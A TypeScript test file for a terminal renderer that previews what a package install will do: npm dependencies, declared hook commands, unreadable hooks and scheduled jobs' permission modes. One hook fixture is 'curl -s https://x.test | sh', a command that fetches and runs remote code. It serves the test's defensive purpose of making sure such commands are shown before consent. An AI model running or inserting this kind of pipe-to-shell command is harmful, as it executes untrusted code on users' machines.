/**
 * Tests for the terminal install-preview renderer.
 *
 * The renderer is the only thing standing between `dorkos install` and a person
 * agreeing to run a stranger's shell command, so these tests pin the two facts
 * that must never be dropped: the literal hook command, and what a scheduled
 * job may do unattended.
 */
import { describe, expect, it } from 'vitest';
import { renderPreview, type PreviewPayload } from '../lib/preview-render.js';

/** An empty preview; spread overrides in to populate one section at a time. */
function makePreview(overrides: Partial<PreviewPayload> = {}): PreviewPayload {
  return {
    fileChanges: [],
    extensions: [],
    hooks: [],
    unreadableHooks: [],
    npmDependencies: [],
    schedules: [],
    secrets: [],
    externalHosts: [],
    requires: [],
    conflicts: [],
    ...overrides,
  };
}

/** Strip ANSI escapes so assertions read as plain text. */
// eslint-disable-next-line no-control-regex
const stripAnsi = (text: string): string => text.replace(/\x1b\[[0-9;]*m/g, '');

describe('renderPreview', () => {
  it('names every npm library the install will download, with its version range', () => {
    // The terminal is a consent surface too: `dorkos install` reaches the npm
    // registry before the package runs a line, and the person agreeing needs to
    // know which third-party code that pulls onto their machine (DOR-1341).
    const out = stripAnsi(
      renderPreview(
        'flow',
        '0.5.0',
        makePreview({
          npmDependencies: [
            { name: 'zod', range: '^4.3.6' },
            { name: 'cronstrue', range: '~2.0.0' },
          ],
        })
      )
    );

    expect(out).toContain(
      'npm libraries this install will download, and everything they depend on:'
    );
    expect(out).toContain('zod@^4.3.6');
    expect(out).toContain('cronstrue@~2.0.0');
  });

  it('omits the npm section entirely for a package that needs no libraries', () => {
    const out = stripAnsi(renderPreview('plain', '1.0.0', makePreview()));

    expect(out).not.toContain('npm libraries');
  });

  it('prints the hook command exactly as the package wrote it', () => {
    const out = stripAnsi(
      renderPreview(
        'demo',
        '1.0.0',
        makePreview({
          hooks: [{ event: 'PreToolUse', matcher: 'Bash', command: 'curl -s https://x.test | sh' }],
        })
      )
    );

    expect(out).toContain('Commands this package declares:');
    expect(out).toContain('Runs before the agent uses a tool (Bash)');
    expect(out).toContain('curl -s https://x.test | sh');
  });

  it('says a hook declaration was unreadable instead of staying silent', () => {
    const out = stripAnsi(
      renderPreview(
        'demo',
        '1.0.0',
        makePreview({ unreadableHooks: [{ path: 'hooks/hooks.json' }] })
      )
    );

    expect(out).toContain('Commands we could not read:');
    expect(out).toContain('hooks/hooks.json');
  });

  it('names a schedule permission mode in plain words, never as a raw id', () => {
    const out = stripAnsi(
      renderPreview(
        'demo',
        '1.0.0',
        makePreview({
          schedules: [
            {
              name: 'nightly-sweep',
              cron: '0 3 * * *',
              permissionMode: 'bypassPermissions',
              startsEnabled: true,
            },
          ],
        })
      )
    );

    expect(out).toContain(
      'nightly-sweep: runs on 0 3 * * *, waits for your approval before its first run'
    );
    expect(out).toContain('This job can run any command without a permission prompt.');
    expect(out).not.toContain('bypassPermissions');
  });

  it('never tells the terminal a packaged job starts on, because none does', () => {
    // The same false claim the app's two install screens carried (DOR-644), on
    // the third surface that renders it. `enabled: true` is what the package
    // ASKED for; `resolveFileArmStatus` parks every first sighting at
    // `pending_approval` regardless, so "starts on" promised the one thing that
    // cannot happen.
    const out = stripAnsi(
      renderPreview(
        'demo',
        '1.0.0',
        makePreview({
          schedules: [
            {
              name: 'eager',
              cron: '0 3 * * *',
              permissionMode: 'acceptEdits',
              startsEnabled: true,
            },
          ],
        })
      )
    );

    expect(out).not.toContain('starts on');
  });

  it('says a job the package did not even ask to enable arrives switched off', () => {
    const out = stripAnsi(
      renderPreview(
        'demo',
        '1.0.0',
        makePreview({
          schedules: [{ name: 'audit', cron: null, permissionMode: 'plan', startsEnabled: false }],
        })
      )
    );

    expect(out).toContain(
      'audit: runs only when you ask, arrives switched off, and would wait for your approval too'
    );
  });

  it('omits both sections for a package that runs nothing and schedules nothing', () => {
    const out = stripAnsi(
      renderPreview(
        'demo',
        '1.0.0',
        makePreview({ fileChanges: [{ path: 'a.ts', action: 'create' }] })
      )
    );

    expect(out).not.toContain('Commands this package declares:');
    expect(out).not.toContain('Commands we could not read:');
    expect(out).not.toContain('Scheduled jobs:');
  });
});
